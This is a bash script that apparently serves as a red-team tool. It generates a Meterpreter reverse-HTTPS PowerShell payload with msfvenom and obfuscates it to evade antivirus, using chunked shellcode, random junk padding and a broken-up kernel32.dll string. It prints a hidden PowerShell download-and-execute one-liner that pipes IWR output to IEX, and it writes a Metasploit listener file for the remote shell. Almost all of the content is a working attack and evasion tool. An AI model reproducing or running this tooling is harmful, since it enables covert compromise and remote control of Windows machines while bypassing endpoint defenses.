#!/bin/bash
# shellcode replacement stuff
# meterpreter PSH-NET payload
# darksh3llRU beta v1.0

# payload options for staged msfvenom -p windows/x64/meterpreter/reverse_https --list-options
# payload options for staged msfvenom -p windows/x64/meterpreter_reverse_https --list-options
#payload="windows/x64/meterpreter_reverse_https"
payload="windows/x64/meterpreter/reverse_winhttps"
ListenerIP=192.168.0.111
ListenerPort=443
ListenerURI="/logout/"
ProxyType=HTTP
ProxyHost=""
ProxyPort=""
ProxyUser=""
ProxyPass=""
declare "UserAgent"="'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'"
DownloadURL="http://10.0.8.4:8080"


# payload options one liner
# reverse_https with proxy settings for stageless only
#payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpProxyType=$ProxyType HttpProxyHost=$ProxyHost HttpProxyPort=$ProxyPort HttpProxyUser=$ProxyUser HttpProxyPass=$ProxyPass HttpUserAgent=$UserAgent"
# reverse https without proxy settings for staged only
payload_options="LHOST=$ListenerIP LPORT=$ListenerPort LURI=$ListenerURI HttpUserAgent=$UserAgent OverrideLHOST=$ListenerIP OverrideLPORT=$ListenerPort OverrideRequestHost=true"
printf "Payload and options used:\n$payload\n$payload_options\n...\n"

# generate payload
raw_payload="msfvenom -p $payload $payload_options -f psh-net -o raw_pshnet_revhttps.ps1"
printf "Generating staged with msfvenom:\n$raw_payload\n...\n"
$raw_payload

# raw payload usage
printf "Raw psh-net usage example:\n"
printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/raw_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"

# extract base64 encoded string, decode, convert to binary format for the future update
# n00b dirty way: cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o '".*"' | sed 's/"//g'
printf "Extracting, decoding and converting shellcode:\n...\n"
cat raw_pshnet_revhttps.ps1 | grep FromBase64String | grep -o '".*"' | sed 's/"//g' > raw_pshnet_revhttps.base64.txt
base64 -d raw_pshnet_revhttps.base64.txt | xxd -p | tr -d '\n'  > raw_pshnet_revhttps.hex.txt

printf "Original shellcode raw_pshnet_revhttps.hex.txt, modify and put into the file final_pshnet_revhttps.hex.txt\n"

# shellcode modification section
# n00b shellcode copy paste -> emulation for shellcode modification !!!SWITCH OFF FOR REAL!!!
cp raw_pshnet_revhttps.hex.txt final_pshnet_revhttps.hex.txt
read -p "Press any key to continue when modified shellcode file is ready..." -n1 -s

# base64 encode the shellcode and put it into ps file
printf "\nStarting converting, encoding and updating ps1 file process...\n"
xxd -p -r final_pshnet_revhttps.hex.txt | base64 | tr -d '\n' > final_pshnet_revhttps.base64.txt
# prepare to shellcode change
raw_shellcode=$(<raw_pshnet_revhttps.base64.txt)
eleet_shellcode=$(<final_pshnet_revhttps.base64.txt)
printf "Old shellcode:\n$raw_shellcode"
printf "\nNew shellcode:\n$eleet_shellcode"

# real eleet stager creations
chunk_size=77
printf "\nSplitting shellcode in chunks with size $chunksize"
cp raw_pshnet_revhttps.ps1 final_pshnet_revhttps.ps1
# determine shellcode size, split by chunk_size in the cycle and put to the array
shellcode_size=${#eleet_shellcode}
printf "DEBUG: Shellcode size is $shellcode_size\n"
shellcode_parts=$(($shellcode_size/$chunk_size))
printf "DEBUG: shellcode will be splited into $shellcode_parts+1 parts\n"

y=0 
for (( i=0; i <=$shellcode_parts; i++))
do
    shellcode_chunks[$i]=$(echo ${eleet_shellcode:$y:$chunk_size})
    y=$(($y+$chunk_size))
done
printf "DEBUG: shellcode_chunks array are printed:\n"
printf "${shellcode_chunks[*]}\n"
printf "DEBUG: shellcode_chunks array are correct?\n"

# insert shellcode_chunks before call to encoded shellcode
for (( x=0; x <=$shellcode_parts; x++))
do
    sed -i "/CompileAssemblyFromSource/a \$sc$x=\"${shellcode_chunks[$x]}\"" final_pshnet_revhttps.ps1
    sed -i "/CompileAssemblyFromSource/G" final_pshnet_revhttps.ps1
    sc_concat+="\$sc$x+"
done

# last + remove trick
sc_concat=${sc_concat%?}
printf "DEBUG: changing base64 string to $sc_concat\n"

# change base64 encoded shellcode with sc_concat variable
sed -i "s,$raw_shellcode,$sc_concat,g" final_pshnet_revhttps.ps1
sed -i "s,\"$sc_concat\",$sc_concat,g" final_pshnet_revhttps.ps1

# extract lines from 2 to 15 and save it as variable
sed -i -e '2,15 {w loader.txt
d}' final_pshnet_revhttps.ps1
loader=$(<loader.txt)
printf "DEBUG LOADER:\n$loader\n"

# generate junk string
junk_size=1337
declare "junk_string"="#$(cat /dev/urandom | tr -dc '(\&\_a-zA-Z0-9\^\*\@' | fold -w ${1:-$junk_size} | head -n 1)"
printf "DEBUG Junk string:\n"
printf "$junk_string\n"

# fill every empty line with junk string
printf "DEBUG Filling final_pshnet_revhttps.ps1 with junk...\n"
sed -i -e "s,^,$junk_string\n," final_pshnet_revhttps.ps1

# insert loader back and fill with junk a bit before it
printf "DEBUG inserting loader back...\n"
sed -i "/Set-StrictMode -Version 2/r loader.txt" final_pshnet_revhttps.ps1
for (( z=0; z <=$shellcode_parts; z++))
do
    sed -i "2i $junk_string" final_pshnet_revhttps.ps1
done

# do kernel32.dll things to avoid detection
#ISB.Downloader!gen245
sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttps.ps1

printf "Final psh-net usage example:\n"
printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"

# createing multu handler listener file
printf "Creating multi handler script file...\n"
printf "use exploit/multi/handler\n" > multihandler.rc
printf "set PAYLOAD $payload\n" >> multihandler.rc
printf "set LHOST $ListenerIP\n" >> multihandler.rc
printf "set LPORT $ListenerPort\n" >> multihandler.rc
printf "set LURI $ListenerURI\n" >> multihandler.rc
printf "set HttpProxyType $ProxyType\n" >> multihandler.rc
printf "set HttpProxyHost $ProxyHost\n" >> multihandler.rc
printf "set HttpProxyPort $ProxyPort\n" >> multihandler.rc
printf "set HttpProxyUser $ProxyUser\n" >> multihandler.rc
printf "set HttpProxyPass $ProxyPass\n" >> multihandler.rc
printf "set HttpUserAgent $UserAgent\n" >> multihandler.rc
printf "set OverrideLHOST $ListenerIP\n" >> multihandler.rc
printf "set OverrideLPORT $ListenerPort\n" >> multihandler.rc
printf "set OverrideRequestHost true\n" >> multihandler.rc
printf "exploit -j -z\n" >> multihandler.rc
printf "Run listener: msfconsole -r multihandler.rc\n"
